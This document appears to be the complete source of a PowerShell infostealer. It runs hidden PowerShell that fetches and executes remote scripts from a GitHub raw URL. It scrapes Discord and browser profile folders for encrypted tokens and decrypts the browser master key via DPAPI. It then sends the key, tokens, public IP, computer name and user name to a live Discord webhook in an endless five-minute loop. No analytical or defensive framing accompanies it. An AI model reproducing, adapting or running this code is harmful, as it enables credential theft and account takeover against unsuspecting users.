#Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/frames.ps1 -UseBasicParsing)"'
powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (IWR 'https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/seco.ps1' -UseBasicParsing)"
Add-Type -AssemblyName System.Device
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Drawing,System.Windows.Forms
$LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")
$PATHS = @{
    'Discord' = "$ROAMING\discord"
    'Discord Canary' = "$ROAMING\discordcanary"
    'Lightcord' = "$ROAMING\Lightcord"
    'Discord PTB' = "$ROAMING\discordptb"
    'Opera' = "$ROAMING\Opera Software\Opera Stable"
    'Opera GX' = "$ROAMING\Opera Software\Opera GX Stable"
    'Amigo' = "$LOCAL\Amigo\User Data"
    'Torch' = "$LOCAL\Torch\User Data"
    'Kometa' = "$LOCAL\Kometa\User Data"
    'Orbitum' = "$LOCAL\Orbitum\User Data"
    'CentBrowser' = "$LOCAL\CentBrowser\User Data"
    '7Star' = "$LOCAL\7Star\7Star\User Data"
    'Sputnik' = "$LOCAL\Sputnik\Sputnik\User Data"
    'Vivaldi' = "$LOCAL\Vivaldi\User Data\Default"
    'Chrome SxS' = "$LOCAL\Google\Chrome SxS\User Data"
    'Chrome' = "$LOCAL\Google\Chrome\User Data\Default"
    'Epic Privacy Browser' = "$LOCAL\Epic Privacy Browser\User Data"
    'Microsoft Edge' = "$LOCAL\Microsoft\Edge\User Data\Defaul"
    'Uran' = "$LOCAL\uCozMedia\Uran\User Data\Default"
    'Yandex' = "$LOCAL\Yandex\YandexBrowser\User Data\Default"
    'Brave' = "$LOCAL\BraveSoftware\Brave-Browser\User Data\Default"
    'Iridium' = "$LOCAL\Iridium\User Data\Default"
}
$pattern = @"
dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*
"@

function Compress-Bytes {
    param ([byte[]]$Bytes)

    $ms = New-Object System.IO.MemoryStream
    $gz = New-Object System.IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Compress)
    $gz.Write($Bytes, 0, $Bytes.Length)
    $gz.Close()
    $compressed = $ms.ToArray()
    $ms.Dispose()
    return $compressed
}

function Unprotect-DPAPI-Key {
    param(
        [string]$b64Key
    )

    $keyBytes = [Convert]::FromBase64String($b64Key)
    $keyTrimmed = $keyBytes[5..($keyBytes.Length - 1)]
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $keyTrimmed, 
        $null, 
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    )
    return $decrypted
}

function Get-Tokens {
    param($path)
    $tokens = @()
    $path += "\Local Storage\leveldb\"

    if (!(Test-Path $path)) {
        return $tokens
    }

    $files = Get-ChildItem -Path $path
    foreach ($file in $files) {
        if ($file.Name -notlike "*.ldb" -and $file.Name -like "*.log") {
            continue
        }

        try {
            $lines = Get-Content -Path $file.FullName -ErrorAction SilentlyContinue
            foreach ($line in $lines) {
                $matchess = [regex]::Matches($line, $pattern)
                foreach ($match in $matchess) {
                    $tokens += $match.Value
                }
            }
        } catch {
            continue
        }
    }

    return $tokens
}

function Get-Key {
    param($path)
    $localStatePath = Join-Path $path "Local State"
    $jsonContent = Get-Content -Path $localStatePath | Out-String
    $key = ($jsonContent | ConvertFrom-Json).os_crypt.encrypted_key
    return $key
}
while ($true) {
foreach ($platform in $PATHS.Keys) {
    $path = $PATHS[$platform]
    if (!(Test-Path $path)) {
        continue
    }
    $tokens = Get-Tokens -path $path
    foreach ($token in $tokens) {
        $token = $token -replace '\\', ''

        $elapsed = 0

        while ($watcher.Position.Location.IsUnknown -and $elapsed -lt $timeout) {
            Start-Sleep -Seconds 1
            $elapsed++
        }
        
        if ($watcher.Position.Location.IsUnknown) {
            Write-Host "Could not get location. Make sure Windows Location Services are enabled."
        } else {
            $loc = $watcher.Position.Location
        }

        try {
            $key = Get-Key -path $path
            $key = Unprotect-DPAPI-Key -b64Key $key
            $ip = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.ipify.org?format=json").Content | ConvertFrom-Json

            $message = @"
{key: "$key",
token: "$token",
ip: "$ip"}
"@

            $payload = @{
                content = $message
                username = "$env:COMPUTERNAME | $env:USERNAME"
            } | ConvertTo-Json -Compress
            Invoke-WebRequest -Uri "https://discord.com/api/webhooks/1396196434646138941/vOksU__xaH72S3cCcxcauq6A45Yn_d7l-Qcvq6-oWachUkMXZDrku17Oeja4miiyFSNM" -Method Post -Body $payload -ContentType 'application/json'

        } catch {
            continue
        }
    }
}
Start-Sleep -Seconds 300
}
